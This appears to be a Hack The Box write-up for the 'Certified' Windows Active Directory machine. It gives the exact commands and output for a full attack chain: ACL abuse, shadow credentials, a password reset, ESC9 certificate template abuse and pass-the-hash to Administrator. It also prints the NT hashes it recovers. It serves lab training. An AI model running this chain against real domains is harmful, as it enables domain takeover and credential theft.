# HTB — Certified Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Category](https://img.shields.io/badge/Category-Active%20Directory-red)

---

## Machine Info

| Field | Value |
|---|---|
| **Name** | Certified |
| **IP** | 10.129.231.186 |
| **OS** | Windows Server 2019 |
| **Domain** | certified.htb |
| **DC** | DC01.certified.htb |
| **Difficulty** | Medium |

**Given credentials:**
- Username: `judith.mader`
- Password: `judith09`

---

## Attack Chain (Overview)

```
judith.mader
    │
    │ WriteOwner → management group
    ▼
management group member
    │
    │ GenericWrite → management_svc (Shadow Credentials)
    ▼
management_svc (NT Hash)
    │
    │ GenericAll → ca_operator (Password Reset)
    ▼
ca_operator
    │
    │ ESC9 → CertifiedAuthentication template
    ▼
Administrator (NT Hash)
    │
    ▼
root.txt ✓
```

---

## 1. Reconnaissance

### 1.1 Port Scan — RustScan

**RustScan** is a fast port scanner. It finds all open ports quickly and then passes them to nmap.

```bash
rustscan -a 10.129.231.186
```

**Result:**
```
Open 10.129.231.186:53    # DNS
Open 10.129.231.186:88    # Kerberos
Open 10.129.231.186:135   # RPC
Open 10.129.231.186:139   # NetBIOS
Open 10.129.231.186:389   # LDAP
Open 10.129.231.186:445   # SMB
Open 10.129.231.186:464   # Kpasswd
Open 10.129.231.186:593   # RPC over HTTP
Open 10.129.231.186:636   # LDAPS
Open 10.129.231.186:3268  # Global Catalog LDAP
Open 10.129.231.186:3269  # Global Catalog LDAPS
Open 10.129.231.186:5985  # WinRM ← important for access
Open 10.129.231.186:9389  # AD Web Services
```

---

### 1.2 Nmap — Deep Scan

**Nmap** — port scan with service version detection and default scripts.

```bash
nmap -sC -sV -p 88,389,445,636,3268,3269,5985 10.129.231.186
```

**Key findings:**
- Domain: `certified.htb`
- Hostname: `DC01.certified.htb`
- Clock skew: `+7h00m00s` ← clock sync will be needed for Kerberos later
- SMB signing: enabled and required ← relay attacks not possible

---

### 1.3 /etc/hosts Configuration

Add the domain to hosts so it resolves properly:

```bash
echo "10.129.231.186  certified.htb dc01.certified.htb" | sudo tee -a /etc/hosts
```

---

### 1.4 BloodHound — AD Enumeration

```bash
bloodhound-python -d certified.htb -u judith.mader -p judith09 -c All --zip -ns 10.129.231.186 -dc dc01.certified.htb
```

The ZIP file is imported into the BloodHound GUI. The following attack paths were found:

| Source | Edge | Target |
|---|---|---|
| `judith.mader` | WriteOwner | `management` group |
| `management` group | GenericWrite | `management_svc` |
| `management_svc` | CanPSRemote | `DC01` |
| `management_svc` | GenericAll | `ca_operator` |

---

## 2. Foothold — judith.mader → management_svc

### 2.1 WriteOwner — Take Ownership of Management Group

**Found by BloodHound:** `judith.mader` has the `WriteOwner` ACL on the `management` group. This means we can change who owns that group.

**bloodyAD** — a Python tool that changes AD objects (users, groups, computers) remotely via LDAP.

```bash
bloodyAD --host "10.129.231.186" -d "certified.htb" -u "judith.mader" -p "judith09" set owner management judith.mader
```

**Result:**
```
[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by judith.mader on management
```

`judith.mader` is now the owner of the `management` group.

---

### 2.2 Write FullControl ACE — dacledit

Now that we are the owner, we write a `FullControl` ACE for ourselves. This gives us full rights over the group, including the ability to add members.

**impacket-dacledit** — edits the DACL (Discretionary Access Control List) of AD objects. It controls who can do what on a given object.

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'judith.mader' -target 'management' "certified.htb"/"judith.mader":'judith09'
```

---

### 2.3 Add Yourself to the Management Group

**net rpc** — a tool that manages group membership via the Windows RPC protocol.

```bash
net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%'judith09' -S "10.129.231.186"
```

**Verify:**

```bash
netexec ldap 10.129.231.186 -u judith.mader -p judith09 -M groupmembership -o USER=judith.mader
```

**Result:**
```
[+] User: judith.mader is member of following groups:
    Management
    Domain Users
```

`judith.mader` is now a member of the `Management` group. This activates the `GenericWrite` right over `management_svc`.

---

### 2.4 Shadow Credentials — Get management_svc NT Hash

**Found by BloodHound:** The `management` group has `GenericWrite` over `management_svc`. This lets us write to the `msDS-KeyCredentialLink` attribute of that account.

**What is a Shadow Credentials attack?**
Every AD user or computer account has an attribute called `msDS-KeyCredentialLink`. If we add our own certificate to this attribute, we can get a Kerberos TGT as that user — without knowing their password.

**certipy-ad** — a tool for working with AD CS (Active Directory Certificate Services), performing shadow credentials attacks, and exploiting ESC vulnerabilities.

```bash
certipy-ad shadow auto -u "judith.mader@certified.htb" -p "judith09" -account "management_svc" -dc-ip 10.129.231.186
```

**Result:**
```
[*] Successfully added Key Credential with device ID '35ef25cd3e904ebb9fb58d080af65bb4'
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

NT hash for `management_svc`: `a091c1832bcdd4677c28b5a6a1295584`

---

### 2.5 Kerberos Clock Sync — Fix Clock Skew

Kerberos requires the time difference between the client and the DC to be less than 5 minutes. Nmap found a +7 hour skew, so we need to fix it before using Kerberos-based tools.

```bash
sudo timedatectl set-ntp false
sudo timedatectl set-time "$(ntpdate -q 10.129.231.186 | head -1 | awk '{print $1, $2}')"
```

> **Note:** NTP is disabled so the system does not change the time automatically. Then the DC's time is set manually.

---

### 2.6 Login with Evil-WinRM — User Flag

**Evil-WinRM** — a tool that opens a PowerShell shell over the WinRM protocol. It supports Pass-the-Hash, so no password is needed.

```bash
evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

```powershell
*Evil-WinRM* PS C:\Users\management_svc\Desktop> type user.txt
```

> 🎯 **user.txt captured!**

---

## 3. Privilege Escalation — management_svc → Administrator

### 3.1 GenericAll — Reset ca_operator Password

**Found by BloodHound:** `management_svc` has `GenericAll` over `ca_operator`. `GenericAll` is the most powerful ACL — it allows everything, including resetting the password.

**impacket-changepasswd** — changes an AD user's password via the SAMR protocol. The `-reset` flag lets you reset a password without knowing the old one.

```bash
impacket-changepasswd "certified.htb/ca_operator@10.129.231.186" -newpass 'Password123!' -altuser "certified.htb/management_svc" -althash a091c1832bcdd4677c28b5a6a1295584 -reset
```

**Result:**
```
[*] Password was changed successfully.
```

**Verify:**

```bash
netexec smb 10.129.231.186 -u ca_operator -p 'Password123!'
```

```
[+] certified.htb\ca_operator:Password123!
```

---

### 3.2 AD CS Enumeration — Find Vulnerable Template

The name `ca_operator` hints that this user is connected to the Certificate Authority. We use `certipy-ad find` to look for vulnerable certificate templates.

```bash
certipy-ad find -u "ca_operator@certified.htb" -p 'Password123!' -dc-ip 10.129.231.186 -vulnerable -stdout
```

**Result — ESC9 found:**
```
Template Name    : CertifiedAuthentication
Enrollment Rights: CERTIFIED.HTB\operator ca
Vulnerabilities  : ESC9 — Template has no security extension (NoSecurityExtension)
```

**What is ESC9?**
Templates with the `NoSecurityExtension` flag do not check the UPN (User Principal Name) inside the certificate. This means we can request a certificate as `ca_operator` but set the UPN to `Administrator` — and the system will accept us as Administrator.

**Requirement:** We need write access to `ca_operator`'s attributes to change the UPN. We have that through `management_svc`'s `GenericAll` right.

---

### 3.3 ESC9 Exploit — Get Administrator Certificate

**Step 1: Change ca_operator's UPN to Administrator**

Using `management_svc`'s `GenericAll`, we update the `userPrincipalName` attribute of `ca_operator`:

```bash
certipy-ad account update -u "management_svc@certified.htb" -hashes :a091c1832bcdd4677c28b5a6a1295584 -user "ca_operator" -upn "Administrator" -dc-ip 10.129.231.186
```

**Result:**
```
[*] Updating user 'ca_operator':
    userPrincipalName: Administrator
[*] Successfully updated 'ca_operator'
```

---

**Step 2: Request the certificate**

We authenticate as `ca_operator`, but the UPN now points to `Administrator`:

```bash
certipy-ad req -u "ca_operator@certified.htb" -p 'Password123!' -ca "certified-DC01-CA" -template "CertifiedAuthentication" -dc-ip 10.129.231.186
```

**Result:**
```
[*] Got certificate with UPN 'Administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

---

**Step 3: Restore ca_operator's UPN (cleanup)**

It is good practice to revert changes after exploiting:

```bash
certipy-ad account update -u "management_svc@certified.htb" -hashes :a091c1832bcdd4677c28b5a6a1295584 -user "ca_operator" -upn "ca_operator@certified.htb" -dc-ip 10.129.231.186
```

---

### 3.4 Get Administrator NT Hash

We use the `administrator.pfx` certificate to get a Kerberos TGT. Certipy also extracts the NT hash automatically:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb
```

**Result:**
```
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

Administrator NT hash: `0d5b49608bbce1751f708748f67e2d34`

---

### 3.5 Login as Administrator — Root Flag

```bash
evil-winrm -i dc01.certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
3f734c2303667ddbd8e05637ee55ef92
```

> 🎯 **root.txt captured! Machine complete.**

---

## 4. Tools Used

| Tool | Purpose |
|---|---|
| `rustscan` | Fast port scanning |
| `nmap` | Service version and script scanning |
| `bloodhound-python` | AD enumeration and attack path analysis |
| `bloodyAD` | Modify AD objects via LDAP |
| `impacket-dacledit` | Edit AD DACL/ACL entries |
| `net rpc` | Manage group membership via RPC |
| `netexec` | Multi-purpose AD tool over SMB/LDAP/WinRM |
| `certipy-ad` | AD CS enumeration, shadow credentials, ESC exploits |
| `impacket-changepasswd` | Reset AD user password remotely |
| `evil-winrm` | PowerShell shell over WinRM (Pass-the-Hash) |

---

## 5. Key Concepts

**WriteOwner** — An ACL that allows changing the owner of an AD object. Once you own an object, you can fully control its DACL.

**GenericWrite** — The right to write certain attributes on an AD account. By writing to `msDS-KeyCredentialLink`, a Shadow Credentials attack becomes possible.

**GenericAll** — Full control — allows password resets, group membership changes, ACL modifications, and more.

**Shadow Credentials** — An attack where you add your own certificate to the `msDS-KeyCredentialLink` attribute of an account, then use that certificate to get a Kerberos TGT without knowing the password.

**ESC9 (AD CS)** — A vulnerability in certificate templates with the `NoSecurityExtension` flag, which allows requesting a certificate with a different user's UPN.

**Pass-the-Hash** — Authenticating using an NT hash instead of a password.

**CanPSRemote** — The right to open a remote PowerShell shell on a computer via WinRM.

---
